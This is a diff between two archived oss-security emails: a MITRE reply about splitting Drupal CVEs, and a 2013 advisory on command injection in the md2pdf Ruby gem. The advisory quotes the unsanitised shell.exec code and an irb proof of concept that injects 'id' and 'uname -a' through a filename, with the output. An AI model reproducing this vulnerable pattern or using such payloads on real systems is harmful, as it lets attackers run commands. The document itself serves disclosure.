@@ -1,34 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/04/4
-Message-ID: <FC72FC641B949240B947AC6F1F83FBAF0906F361@IMCMBX01.MITRE.ORG>
-Date: Thu, 4 Apr 2013 16:32:56 +0000
-From: "Christey, Steven M." <coley@...re.org>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: RE: Confused with Drupal CVEs
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/13/2
+Message-id: <e22654bc-b61d-4e62-a02a-07d8362f473e@me.com>
+Date: Sat, 13 Apr 2013 02:09:20 +0000 (GMT)
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Remote command injection md2pdf ruby gem
 Content-Type: text/plain; charset=utf-8
 
-Henri,
+Remote command injection md2pdf ruby gem
+4/10/2013
 
-While SA-CONTRIB-2013-001 listed only one CVE, CVE-2013-0181, there were two vulnerabilities that were found by different researchers.  While they were originally merged into a single CVE (same vulnerability type), we also have guidelines that SPLIT issues into different groups if they are found by different researchers.  So, the MITRE team SPLIT these CVEs accordingly, after the initial erroneous assignment.  We listed http://www.openwall.com/lists/oss-security/2013/01/15/3 as a reference for the new/split CVE-2013-2715 because this was effectively where the vulnerability was more widely disclosed.
+Description: "creates pdf documents from markdown documents"
 
-- Steve
+https://rubygems.org/gems/md2pdf
 
+In md2pdf/converter.rb we see user supplied input being passed to the command line with out proper sanitization.
 
+ 12       shell.exec("pandoc#{options} #{input_filename} -o #{output_filename}")
 
->-----Original Message-----
->From: Henri Salo [mailto:henri@...v.fi]
->Sent: Thursday, April 04, 2013 2:58 AM
->To: oss-security@...ts.openwall.com
->Subject: [oss-security] Confused with Drupal CVEs
->
->Hello,
->
->SA-CONTRIB-2013-001 https://drupal.org/node/1884332 CVE-2013-0181
->
->Why does http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2715
->link to http://www.openwall.com/lists/oss-security/2013/01/15/3
->
->Duplicate?
->
->---
->Henri Salo
+23 shell.exec("pdftk #{temp_filename} multibackground #{background_path} outpu t #{output_filename}")
+
+Where exec is defined as the following:
+
+ 37     def exec(command_line)
+ 38       require 'open3'
+ 39       stdin, stdout, stderr = Open3.popen3(command_line)
+ 40       return stdout.read
+ 41     end
+
+Notes
+
+irb(main):001:0> require 'open3'
+=> true
+irb(main):002:0> stdin, stdout, stderr = Open3.popen3('pdfcnv filename;id;uname -a;.pdft')
+=> [#, #, #]
+irb(main):003:0> puts stdout.read
+uid=1000(larry) gid=1000(larry) groups=1000(larry),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),117(sambashare)
+Linux underfl0w 3.2.0-39-virtual #62-Ubuntu SMP Wed Feb 27 22:45:45 UTC 2013 i686 athlon i386 GNU/Linux
+=> nil
+
+http://vapid.dhs.org/advisories/md2pdf-remote-exec.html
+
+This vulnerability doesn't have a CVE yet assigned.﻿
+
+Larry W. Cashdollar
+@_larry0
+Content of type "text/html" skipped
